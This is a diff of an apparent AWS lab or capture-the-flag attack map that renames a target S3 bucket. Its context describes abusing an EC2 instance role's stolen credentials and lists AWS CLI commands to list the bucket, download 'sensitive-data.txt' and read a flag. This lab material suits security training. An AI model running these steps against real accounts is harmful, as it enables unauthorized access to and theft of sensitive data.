@@ -47,7 +47,7 @@ attackMap:
       type: resource
       subType: s3-bucket
       isTarget: true
-      arn: "arn:aws:s3:::pl-sensitive-data-ssm-001-to-bucket-{account_id}-{suffix}"
+      arn: "arn:aws:s3:::pl-sensitive-data-ssm-001-{account_id}-{suffix}"
       description: >
         This S3 bucket contains sensitive data. The EC2 instance role has s3:GetObject and
         s3:ListBucket permissions on this bucket. By extracting the instance role credentials
@@ -100,8 +100,8 @@ attackMap:
         - description: "Verify credential identity"
           command: "aws sts get-caller-identity"
         - description: "List bucket contents"
-          command: "aws s3 ls s3://pl-sensitive-data-ssm-001-to-bucket-<account_id>-<suffix>/"
+          command: "aws s3 ls s3://pl-sensitive-data-ssm-001-<account_id>-<suffix>/"
         - description: "Download sensitive data"
-          command: "aws s3 cp s3://pl-sensitive-data-ssm-001-to-bucket-<account_id>-<suffix>/sensitive-data.txt ."
+          command: "aws s3 cp s3://pl-sensitive-data-ssm-001-<account_id>-<suffix>/sensitive-data.txt ."
         - description: "Capture the CTF flag"
-          command: "aws s3 cp s3://pl-sensitive-data-ssm-001-to-bucket-<account_id>-<suffix>/flag.txt -"
+          command: "aws s3 cp s3://pl-sensitive-data-ssm-001-<account_id>-<suffix>/flag.txt -"
